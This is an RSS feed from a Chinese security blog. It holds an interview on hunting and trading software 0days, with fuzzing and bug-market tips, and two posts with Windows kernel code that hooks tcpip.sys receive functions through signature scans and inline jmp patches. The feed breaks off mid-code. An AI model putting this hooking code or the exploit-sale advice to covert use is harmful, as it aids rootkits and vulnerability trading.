<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Safe on Rise的自留地</title><link>https://blogs.qipai360.cn/categories/safe/</link><description>Recent content in Safe on Rise的自留地</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Wed, 20 Nov 2013 14:41:00 +0800</lastBuildDate><atom:link href="https://blogs.qipai360.cn/categories/safe/rss.xml" rel="self" type="application/rss+xml"/><item><title>公布一个PPT0day</title><link>https://blogs.qipai360.cn/post/publish-ppt-zero-day/</link><pubDate>Fri, 15 May 2009 19:08:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/publish-ppt-zero-day/</guid><description>&lt;p&gt;最近没啥好八卦的,拿这个来充数.HOHO.0day在文章最后面. &lt;p&gt;|=---------------------------------------------------------------------------=|
|=----------------------=[ 专访wordexp ]=---------------------=|
|=---------------------------------------------------------------------------=|
|=---------------------------------------------------------------------------=|
|=-------------------=[ By wordexp ]=------------------=|
|=---------------------------------------------------------------------------=| &lt;p&gt;[目录]
1. 据您所知现在都还有哪些严重的0DAY没被公开？
2. 挖漏洞有什么窍门？可以具体谈谈fuzzer怎样构造样本么？
3. 请问您对0day市场有什么看法？
4. 您建立wordexp这个blog的初衷是什么？为什么叫wordexp，而不是pdfexp或者是exclexp？
5. 请问0day是咋来的？
6. 请问在安全圈子谁是您的偶像？
7. 请问溢出这面红旗还能打多久？
8. 您对我们杂志以及我们小组的发展有什么建议？ 
一、据您所知现在都还有哪些严重的0DAY没被公开？
 主流应用软件方面目前微软公司的IE6/7和PPT 2003 SP3前一阵子就有EXP在外面跑了，
adobe公司的FLASH产品中也有一个能被利用的漏洞，拿到的人应该也不少，往后的一到三个月
内就应该出补丁或是有相关新闻，当然以我们目前的视界能看到的只有很少很少的一部分，其
实国外的很多安全机构比如：idefense和zdi可以确定还有不少没被公开的漏洞，只是这些漏
洞可能并不是我们想象的那么通用，成功率也许有限。
 其实经常听到朋友问这个问题，说白了就是个消息的打听，这个一方面要提高自已的敏感
度，注意随时关注国内外相关网站的新闻，比如NORTON和MCAFEE的网站经常有一些抓到的0DAY
样本的新闻，有时还有一些细节。还有就是消息的共享，你提前能知道消息并告知朋友，以后
也许人家也会这样对你。
二、挖漏洞有什么窍门？可以具体谈谈fuzzer怎样构造样本么？
 这个问题太为难我了，很多人比我更有资格回答这个问题。我只是斗胆胡说几句。
 要说窍门，应该是不同软件的洞窍门还不一样，然后还要看挖洞的目的，如果是为了出名
在bugtraq之类的邮件列表上能多露几次脸，那么可以尽可能的找那种用户少关注少的软件特
别是WEB脚本程序的洞。如果是公司有任务必须往CVE、MS上报多少条漏洞那么可以找大公司
的二三线产品的漏洞或是有一定用户数但版本很久不更新的软件的洞，而且这些洞是不一定
要可利用的。如果是为了混zdi、idefense那么可以把fuzz到的POC只要看起来有可能被利用
的都提交上去，也可以找默认情况下不支持的功能的洞，多少可以骗点钱。
 如果是要挖卖得出去也能利用的洞，比较通用的一些窍门我能想到的是：
 1. 找大众软件生僻功能，生僻协议/文件格式的洞
 2. 找几乎没有文档化的功能的洞
 3. 新版本软件为了向下兼容所支持的老协议/老文件格式的洞
 4. 新版本软件增加的新功能/新格式
 5. 不容易fuzz到的洞，比如数据是加密/压缩/编码过的，或是有验效的
 6. 某软件某功能刚出了漏洞，马上测试其它同类软件同类功能是否有类似漏洞
 7. 多分析老漏洞，善于总结前人挖漏洞的经验技巧，很多不同的洞其实都有相类似的发
 掘方式和思路
 第二个问题，我以文件型漏洞举例子，fuzz样本的构造，首先是按照上述几个窍门来生成
原始模版，这样相对可以弄出一些人家不太容易fuzz到的数据格式结构，当然在生成原始模版
的前期功课也是很花时间的。做好样本后就是写具体的fuzz程序， 如果对文件格式比较熟，
那么可以节约很多的时间，我比较喜欢的一个办法是fuzz某一些功能的洞，那么就先看格式，
把数据在文件中的位置先手工定位，然后小粒度的测试，要注意的是可能与某功能相关联的数
据比较杂乱数据很可能并不是连续存放的。一般1-4KB的数据要不了多少时间就可以手工测
试完毕。另外具体测试时，数据替换的长度（一次替换几个字节），替换的内容也是非常重要的。
为此我们将提供一个PPT 2003 sp3的“0day”poc，在这个“0day”中数据替换的步进就必须为1
字节，而且值也必须为一个固定的值才能触发出错。最后要注意的就是错误的捕捉，有些洞是
打开就退出进程，有些是打开要停顿一定时间才退出进程，有些是CPU 100%程序挂起，有些是
关闭时触发，甚至有些是文档打开后进行某种操作才会触发，当然还有一种情况进程不退出，
也没有提示，也不出错，象这种情况一般依靠进程/窗口/CPU来检测错误的fuzz就失效了。 
三、请问您对0day市场有什么看法？
 很复杂的一个圈子，搞技术的不搞技术的啥人都有，不过目前看来很多都是为了各种利益
混这个圈子。简单说就是：
 池塘不大但人杂，水深。
四、您建立wordexp这个blog的初衷是什么？为什么叫wordexp，而不是pdfexp或者是exclexp？
 初衷就是团队成员工作之余发发劳骚，聊聊八卦的地方，希望大家别见怪。另外这个名字
是因为我们几个人搞客户端的漏洞都比较多，所以随便就取了这么个名字。 
五、请问0day是咋来的？
 最初当然是某个人找出来的。从这个0DAY的发掘者到最终的用户中间可能会只有一层关
系，也可能会有N层关系，也许直到这个0DAY被补上，使用者也不知道洞是谁挖到的。下面举几
个例子吧：
 情况一：A挖到一个0day，但对黑产没有了解或接触，或者也不想靠这个赚钱，或者觉得漏
洞不值钱，或者压根以为漏洞不能够被利用，那么A有可能把这个漏洞公开给类似PST的网站，
网站上的代码通常是POC或是只有一部分细节。这时黑产中的漏洞研究者B，很快会看到这个
消息，并且分析POC然后写出EXP。随后B再联系具体的使用者C或是自已使用。最终或是因为
这个0DAY的POC被公开，也或许因为EXP被杀毒软件公司抓到样本等等，软件厂商推出补丁。在
这个过程中B可能是一个人也可能是很多水平各不相同的人，所以公开的0DAY的EXP有时是千
差万别，有的好用，有的很差。
 情况二：A是黑产中的一员，挖到一个0DAY并卖给X，或是接受使用者X的定制并找到0DAY，
X偷偷的使用0DAY，这样的情况一般0DAY的生存期会比较长一些，因为这才算是真正的私洞，知
道的人不多。但是在X的使用中，EXP可能被别的黑产从业者Y抓到样本，然后Y把样本提供给技
术员T分析并重新写出EXP，而成果Y和T分享。这时T可能再次把EXP卖给其它的黑产使用者W，
同样X或Y在使用一段时间后也可能交换或者再出手给其它的买家，而且这个过程是可以无限
次重复的，当然时间越久知道的人越多，0DAY就越掉价。
 情况三：白帽子A挖到一个0day，并提交给软件厂商B。假设A是个真真正正的白帽子，也假
设这个0day的确也只被A发现了，但0day到了厂商B那儿，最终会找公司内负责安全的部门对漏
洞进行研究，假设这个公司内部的研究者是C，C有可能在圈子中也有其它从事黑产的朋友或是
自已本身就偷偷的在参与黑产，那么在金钱或是感情的作用下C完全有可能违背道德，写出EXP
出售或是使用。象这种情况，0day可能刚出来没几天就被补上了，或者圈子里的很多人根本就
没机会见到0day，知道有这么个东东的时候早就被补上了。
 情况四：软件厂商B在代码审计或软件测试过程中发现了漏洞，自已在新版本中偷偷的补
上了漏洞，但并没有在相对老的版本中打补丁，也没有公开任何细节和公告。 研究人员A通过
补丁比较，直接定位出老版本中的漏洞位置，然后动态调试找到触发方式，并写出EXP，由于很
多情况下老版本的软件反而用户更多，所以这样的0day还是有一定的价值。
 情况五：研究员A挖到了一个Nday而这个Nday以前在圈内并不为人所知，或是研究员A研究
出某Nday的新利用方式，比如说可以和某某软件结合看起来和以前的EXP完全不一样，或是成
功率有很大的提高。研究员A以较低的价格出售给中间人B。B拿到EXP后，发现圈内还没人有，
成功率各方面也还不错，于是号称0day到处叫卖。如果买家发现问题，B就装傻说自已也上当
了。现在象B这样的人其实也是不少的， 因为很多最终用户对技术并不是特别懂，而且有些
Nday测试起来也不是那么简单，如果刚好EXP效果不错，可能就忽悠过去了。那么我们能看到
的情况就是，江湖传言又出了个0day，或是某某手上有0day，但等呀等就是见不到东东，最终传
言不了了之或是被人家揭发出来。
 所以要搞到0day可以自已挖，可以补丁比较，也可以分析已公开信息快速写出EXP，可以买，
也可以换，不要命也可以偷抢骗，技术手段非技术手段都是可能的。也正是因为上述情况的多
样性，所以经常有不怎么搞技术的人，手上也有些0day。
六、请问在安全圈子谁是您的偶像？
 我的偶象是那种啥技术不懂，还能发大财的，不PF不行。 
七、请问溢出这面红旗还能打多久？
 仅仅是溢出这块，我们团队里面意见也大不相同，另外几个成员还是比较乐观的，如果比
较全面的分析这个问题，首先要看站在什么人的角度来看这个问题，是黑产工作者是安全公司
还是软件生产商。假设以黑产工作者的角度来看，那么我是非常非常悲观的，因为溢出漏洞从
技术角度上说：有一个通用性和成功率的问题，直观的说就是有一个效果的问题，再深一点说
就是经济成本的问题。往后走溢出漏洞单从个数上说还是会有很多的。但是现在从编译器和
OS（/GS、/SafeSEH、/DYNAMICBASE、DEP、PEB随机等等）到CPU（NX），软件公司和硬件厂商已
经越来越关注安全问题，几十年来溢出漏洞最关键的命脉无非是数据能够被当做代码来执行，
以前这一点基本上不被软硬件厂商所重视，这几年来人家开始重视了，开始从体系上解决这个
问题，那么这个命脉也将因为各种防范检测技术的运用被卡得越来越死，另外现在很多软件也
有自动升级功能了。
 往后走是个什么样的情况，我想应该是上面提到的各种技术随着新型CPU和OS的占有率越
来越高，被越来越多的应用。一个溢出漏洞的成功率将会大大下降，再加上主流软件公司的产
品也越来越安全，以后那种一个漏洞打天下的局面将会越来越少(现在黑产工作者的网马都是
漏洞合集了，无非就是提高成功率)，具体的情况也许就是现在我有一个IE的0DAY，100个人看
也许能中10-20个，以后可能手上能用的就变成某个第三方控件的0DAY，100个人看网页就能中
1-2个吧。当你使用溢出漏洞的时间，人力，金钱成本和产出完全不成正比的时候，也基本上算
溢出这面红旗倒下的时候。
 估计也就三四年以后，具体指标就是上面提到的各种检测技术的普及率，至少往后的发展
不会是车到山前必有路。如果把挖溢出漏洞当成一个产业，也就是个夕阳产业。
八、您对我们杂志以及我们小组的发展有什么建议？ 
 不走商业路线是正确的，反正你们那群人也不差钱，就不定期搞搞科普工作吧，为普及中
国安全事业做点贡献，同时也可以锻炼你们各方面的能力，继续努力! 
-EOF-&lt;/p&gt;</description></item><item><title>探索NDIS HOOK新的实现方法(1)</title><link>https://blogs.qipai360.cn/post/exploring-new-ndis-hook-implementation-methods-part-1/</link><pubDate>Sat, 30 Aug 2008 23:43:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/exploring-new-ndis-hook-implementation-methods-part-1/</guid><description>&lt;p&gt;NDIS HOOK是专业级防火墙使用的一种拦截技术，NDIS HOOK的重点是如何获得特定协议对应NDIS_PROTOCOL_BLOCK指针，获得了该指针，接下来就可以替换该协议所注册的收发函数,而达到拦截网络数据的目的。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 获 得NDIS_PROTOCOL_BLOCK指针的方法一般是用NdisRegisterProtocol注册一个新的协议，所获得的协议句柄实际上就是一 个NDIS_PROTOCOL_BLOCK指针，顺着该指针遍历NDIS_PROTOCOL_BLOCK链表，就可以找到你所要挂钩的协议所对应的 NDIS_PROTOCOL_BLOCK.之所以可以这样做，是因为每注册一个协议，系统都会把该协议对应的NDIS_PROTOCOL_BLOCK放置 在协议链表的开头，该协议链表每个元素都是NDIS_PROTOCOL_BLOCK类型，代表一个已经注册的协议。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 事 实上我们需要的只是TCPIP协议族的NDIS_PROTOCOL_BLOCK指针，毕竟TCP,IP,ARP,ICMP等等几乎所有我们感兴趣的协议， 都是在tcpip.sys协议驱动里面实现的。如果我们只需要TCPIP协议所对应的NDIS_PROTOCOL_BLOCK，那么上面的方法就有点繁琐 了。我们可以试着寻找更简便的方法来获得TCPIP协议的NDIS_PROTOCOL_BLOCK.&lt;br&gt;于 是我对tcpip.sys驱动进行了反汇编，发现NDIS_PROTOCOL_BLOCK指针存放在一个名为_ARPHandle的全局变量里面，所以如 果能找到_ARPHandle的地址，我们就成功了，我们完全可以把该全局变量的偏移量作为一个常量来使用，但这里纯粹为了拓宽思路，我介绍另一种找到该 全局变量的方法。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Tcpip.sys有个导出函数叫IPDelayedNdisReEnumerateBindings,该函数内部曾经出现过_ARPHandle 的地址，为什么会出现它的地址呢，因为该函数内部调用过NdisReEnumerateProtocolBindings函数，懂得反汇编的应该知道，在 用call指令调用函数之前，必然会用到push指令将函数的参数压到栈里面去，不巧的是， NdisReEnumerateProtocolBindings函数只有一个参数，而该参数恰恰是一个NDIS_PROTOCOL_BLOCK指针类 型，在这里，实际上就是把_ARPHandle当作参数传给了&lt;br&gt;NdisReEnumerateProtocolBindings，所以_ARPHandle的地址必然会出现在push指令的后面，说具体一点，紧跟push指令的四个字节就是_ARPHandle的地址。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 所以具体的思路就是这样，先找到IPDelayedNdisReEnumerateBindings函数的地址，然后从该函数的地址开始搜索push指令的特征码，搜到了以后，把紧跟push指令的四个字节作为指向NDIS_PROTOCOL_BLOCK指针的指针返回。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 也许有的人会问，如果IPDelayedNdisReEnumerateBindings函数体内部出现过多次push指令，岂不是会搜出不正确的地址，事实上，虽然都叫push指令，然而在机器码级别是不同的，push指令的机器码表示有十几种之多，用来区别不同的寻址方式，调用NdisReEnumerateProtocolBindings 时用的push指令字节序列是0xff35，这个push指令表示后面紧跟的四个字节是一个内存地址，而不是一个立即数或者寄存器之类的。知道了这些，我 们就可以清楚，在一个有限的地址范围，0xff35的唯一性是可以得到满足的。根据我的观察，在win2000,winxp,win2003上面，IPDelayedNdisReEnumerateBindings本身是一个很短的函数，0xff35指令确实只出现过一次，所以该方法是很可靠的。&lt;br&gt;思路已经出来了，下面我把详细的代码给大家贴出来，理解这些代码需要对windows Pe格式有所了解，如果你不想理解也行，代码可以直接拿来用。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 以下是我写的一个 获取内核模块某个导出函数地址的 通用例程。这里主要是为了获取tcpip.sys模块的导出函数IPDelayedNdisReEnumerateBindings&lt;br&gt;&amp;nbsp;&amp;nbsp; void* GetRoutineAddress(char* ModuleName,char* RoutineName)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; PIMAGE_DOS_HEADER dos_hdr;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PIMAGE_NT_HEADERS nt_hdr;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PIMAGE_EXPORT_DIRECTORY export_dir;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG *fn_name, *fn_addr, i;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; char* base;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; base=(char*)FindModule(ModuleName);//该函数用来获得内核模块的基地址&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(!base)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return NULL;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DbgPrint("tcpip address:%p",base);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; dos_hdr = (PIMAGE_DOS_HEADER)base;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (dos_hdr-&amp;gt;e_magic != IMAGE_DOS_SIGNATURE)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return NULL;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; nt_hdr = (PIMAGE_NT_HEADERS)(base + dos_hdr-&amp;gt;e_lfanew);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; export_dir = (PIMAGE_EXPORT_DIRECTORY)(base + nt_hdr-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; fn_name = (ULONG *)(base + export_dir-&amp;gt;AddressOfNames);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; fn_addr = (ULONG *)(base + export_dir-&amp;gt;AddressOfFunctions);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; for (i = 0; i &amp;lt; export_dir-&amp;gt;NumberOfNames; i++, fn_name++, fn_addr++)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (strcmp(RoutineName, base + *fn_name) == 0)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return base + *fn_addr;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; return NULL;&lt;br&gt;}&lt;br&gt;以下是FindModule函数的实现：&lt;br&gt;void *&lt;br&gt;FindModule(char *name)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG i, n, *q;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PSYSTEM_MODULE_INFORMATION p;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; void *base;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ZwQuerySystemInformation(SystemModuleInformation, &amp;amp;n, 0, &amp;amp;n);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; q = (ULONG *)ExAllocatePool(PagedPool, n);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ZwQuerySystemInformation(SystemModuleInformation, q, n * sizeof (*q), 0);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; p = (PSYSTEM_MODULE_INFORMATION)(q + 1);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; base = NULL;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; for (i = 0; i &amp;lt; *q; i++) {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (_stricmp(p&lt;i&gt;.ImageName + p&lt;i&gt;.ModuleNameOffset, name) == 0) {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; base = p&lt;i&gt;.Base;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; break;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ExFreePool(q);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; return base;&lt;br&gt;}&lt;br&gt;以下是获取tcpip协议的NDIS_PROTOCOL_BLOCK指针的函数&lt;br&gt;&amp;nbsp;&amp;nbsp; void* GetProtocolBlock()&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; char* base;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; char bytes[]={0xff,0x35};&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; base=GetRoutineAddress("tcpip.sys","IPDelayedNdisReEnumerateBindings");&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; while(RtlCompareMemory(base,bytes,2)!=2)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; base++;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; return **((void***)(base+2));&lt;br&gt;}&lt;/i&gt;&lt;/i&gt;&lt;/i&gt;&lt;i&gt;&lt;i&gt;&lt;i&gt;&lt;/i&gt;&lt;/i&gt;&lt;/i&gt;&lt;/p&gt;</description></item><item><title>探索NDIS HOOK新的实现方法(2)</title><link>https://blogs.qipai360.cn/post/exploring-new-ndis-hook-implementation-methods-part-2/</link><pubDate>Sat, 30 Aug 2008 23:43:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/exploring-new-ndis-hook-implementation-methods-part-2/</guid><description>&lt;p&gt;&lt;/p&gt; &lt;p&gt;---INLINE HOOK实现NDIS HOOK&lt;br&gt;前面讲述了如何通过获取NDIS_PROTOCOL_BLOCK来实现NDIS HOOK，这里讲述第二种方法，那就是inline hook方法。说起inline hook，也不是什么新鲜玩意，无非是在一个函数的首部嵌入一个jmp机器指令，在该函数执行有效代码前就跳到我们的代理函数，在我们的代理函数里做了必要的处理以后，再跳回原来的函数，接着执行原函数的指令。&lt;br&gt;既然tcpip.sys是标准的NDIS协议驱动，那么收包函数显然应该是在tcpip.sys内部实现的，我们直接找到这两个收包函数，然后对其inline hook不就可以了吗？经过逆向分析，我找到了这两个函数，本人安装了两个XP系统，其中一个导出了这两个函数，另一个系统却没导出，所以我们仍然需要用特征码搜索这两个函数，这两个函数声明如下：&lt;br&gt;NDIS_STATUS &lt;br&gt;ARPRcv (NDIS_HANDLE BindContext,&lt;br&gt;NDIS_HANDLE MacContext,&lt;br&gt;UCHAR* HeadBuffer,&lt;br&gt;ULONG HeadSize,&lt;br&gt;UCHAR* Buffer,&lt;br&gt;ULONG BufferSize,&lt;br&gt;ULONG PacketSize);&lt;br&gt;INT&lt;br&gt;ARPRcvPacket (NDIS_HANDLE BindContext,&lt;br&gt;PNDIS_PACKET Packet);&lt;br&gt;搜索这两个函数地址的代码如下：&lt;br&gt;//以下全局变量保存两个函数的地址&lt;br&gt;void* ARPRcv=NULL; &lt;br&gt;void* ARPRcvPacket=NULL;&lt;br&gt;void SearchProtocolRoutine()&lt;br&gt;{&lt;br&gt;//以下分别为两个收包函数的特征码&lt;br&gt;UCHAR ARPRcvBytes[] ={0x8b,0xff,0x55,0x8b,0xec,0x56,0x8b,0x75,0x08,0x33};&lt;br&gt;UCHAR ARPRcvPacketBytes[]={0x8b,0xff,0x55,0x8b,0xec,0x51,0x53,0x56,0x57,0x8b};&lt;br&gt;//获取tcpip.sys模块的基地址，该函数在前一节已经提供给大家&lt;br&gt;char* base=FindModule("tcpip.sys");&lt;br&gt;while(ARPRcv==NULL||ARPRcvPacket==NULL)&lt;br&gt;{&lt;br&gt;if(ARPRcv==NULL&amp;amp;&amp;amp;&lt;br&gt;RtlCompareMemory(ARPRcvBytes,base,10)==10)&lt;br&gt;{&lt;br&gt;ARPRcv=base;&lt;br&gt;}&lt;br&gt;else if(ARPRcvPacket==NULL&amp;amp;&amp;amp;&lt;br&gt;RtlCompareMemory(ARPRcvPacketBytes,base,10)==10)&lt;br&gt;{&lt;br&gt;ARPRcvPacket=base;&lt;br&gt;}&lt;br&gt;base++;&lt;br&gt;}&lt;br&gt;}&lt;br&gt;各种编译器所编译的函数，前几个指令都是几乎一样的，用来建立堆栈帧，这些指令叫函数的序言。&lt;br&gt;在win2000上是三字节&lt;br&gt;push ebp&lt;br&gt;mov ebp, esp&lt;br&gt;到了winxp以及后续系统上，则变成了五字节&lt;br&gt;mov edi, edi&lt;br&gt;push ebp&lt;br&gt;mov ebp, esp&lt;br&gt;而一个近跳转指令刚好是五字节，在xp上刚好覆盖了函数的序言，所以在XP上挂钩也相对容易一点，这里着重说明如何对ARPRcv进行挂钩，我们在ARPRcv内部插入一个jmp指令，将跳到ARPRcvProx函数，该函数是个裸函数，函数实现如下：&lt;br&gt;_declspec(naked) ARPRcvProx()//跳板函数&lt;br&gt;{&lt;br&gt;_asm&lt;br&gt;{&lt;br&gt;mov edi, edi&lt;br&gt;push ebp&lt;br&gt;mov ebp ,esp&lt;br&gt;//七个参数开始压栈&lt;br&gt;push [ebp+20h]&lt;br&gt;push [ebp+1ch]&lt;br&gt;push [ebp+18h]&lt;br&gt;push [ebp+14h]&lt;br&gt;push [ebp+10h]&lt;br&gt;push [ebp+0ch]&lt;br&gt;push [ebp+8]&lt;br&gt;call NewARPRcv //调用NewARPRcv函数&lt;br&gt;cmp eax,0x10003 //判断函数返回值是否NDIS_STATUS_NOT_ACCEPTED&lt;br&gt;jz end //如果是NDIS_STATUS_NOT_ACCEPTED，直接结束本函数&lt;br&gt;//而不跳回到ARPRcv函数&lt;br&gt;mov eax,ARPRcv //如果返回的不是NDIS_STATUS_NOT_ACCEPTED，将会&lt;br&gt;//执行到这条指令，该指令将 ARPRcv函数的地址装入eax&lt;br&gt;add eax,5 //将ARPRcv地址值加上5，存入eax，表示即将跳转的//地址&lt;br&gt;jmp eax //开始跳回ARPRcv体内&lt;br&gt;end: &lt;br&gt;pop ebp&lt;br&gt;retn 1ch&lt;br&gt;}&lt;br&gt;}&lt;br&gt;在该函数内部，又调用了NewARPRcv函数，原型和ARPRcv保持一致，也必须由我们自己实现：&lt;br&gt;NDIS_STATUS &lt;br&gt;NewARPRcv(&lt;br&gt;IN NDIS_HANDLE ProtocolBindingContext,&lt;br&gt;IN NDIS_HANDLE MacReceiveContext,&lt;br&gt;IN PVOID HeaderBuffer,&lt;br&gt;IN UINT HeaderBufferSize,&lt;br&gt;IN PVOID LookAheadBuffer,&lt;br&gt;IN UINT LookaheadBufferSize,&lt;br&gt;IN UINT PacketSize&lt;br&gt;)&lt;br&gt;{&lt;br&gt;/*&lt;br&gt;在这里加入你的判断逻辑代码，是否拦截该数据&lt;br&gt;如果要拦截，则返回 NDIS_STATUS_NOT_ACCEPTED&lt;br&gt;否则返回NDIS_STATUS_SUCCESS，把数据交给ARPRcv处理&lt;br&gt;*/&lt;br&gt;return NDIS_STATUS_SUCCESS;&lt;br&gt;}&lt;br&gt;同样的原理，我们在ARPRcvPacket里面插入jmp指令，将跳转到ARPRcvPacketProx裸函数，该函数实现如下：&lt;br&gt;_declspec(naked) ARPRcvPacketProx()&lt;br&gt;{&lt;br&gt;_asm&lt;br&gt;{&lt;br&gt;mov edi, edi&lt;br&gt;push ebp&lt;br&gt;mov ebp ,esp&lt;br&gt;//两个参数开始压栈&lt;br&gt;push [ebp+0ch]&lt;br&gt;push [ebp+8]&lt;br&gt;call NewARPRcvPacket//调用NewARPRcvPacket &lt;br&gt;cmp eax,0 //如果返回0则表示拒绝该数据包&lt;br&gt;jz end //直接返回本函数&lt;br&gt;mov eax ,ARPRcvPacket&lt;br&gt;add eax ,5&lt;br&gt;jmp eax //跳回ARPRcvPacket函数第六个字节&lt;br&gt;end: pop ebp&lt;br&gt;retn 8&lt;br&gt;}&lt;br&gt;}&lt;br&gt;在该函数内部，将会调用NewARPRcvPacket,函数实现如下：&lt;br&gt;INT &lt;br&gt;NewARPRcvPacket(NDIS_HANDLE BindContext,&lt;br&gt;PNDIS_PACKET ndisPacket)&lt;br&gt;{&lt;br&gt;/*&lt;br&gt;在这里加入你的判断逻辑，是否拦截该数据，如果要拦截，则返回0，&lt;br&gt;否则返回非0&lt;br&gt;*/&lt;br&gt;DbgPrint("RcvPacket");&lt;br&gt;return 1;&lt;br&gt;}&lt;br&gt;请仔细阅读以上代码的注释，接下来，我们还必须提供一个函数实现安装和卸载挂钩功能&lt;br&gt;void PatchARPRcv(BOOLEAN isPatch)//isPatch为TRUE表示安装挂钩，为FALSE表示卸载挂钩。&lt;br&gt;{&lt;br&gt;/*即将用以下五个字节覆盖ARPRcv函数前五个字节 &lt;br&gt;这5个字节就是jmp XXXX指令的机器码，因为跳转的相对地址还需要&lt;br&gt;进一步计算，所以暂时用零填充&lt;br&gt;*/&lt;br&gt;UCHAR patchBytes[5]={0xe9,0x00,0x00,0x00,0x00};&lt;br&gt;//即将用以下五个字节覆盖ARPRcvPacket函数前五个字节&lt;br&gt;UCHAR patchBytes2[5]={0xe9,0x00,0x00,0x00,0x00};&lt;br&gt;//保存原始函数的前五个字节，方便以后恢复挂钩&lt;br&gt;UCHAR restoreBytes[5]={0x8b,0xff,0x55,0x8b,0xec};&lt;br&gt;/* &lt;br&gt;以下两行代码计算跳转的偏移量&lt;br&gt;*/&lt;br&gt;int offset=(char*)ARPRcvProx-(char*)ARPRcv-5;&lt;br&gt;int 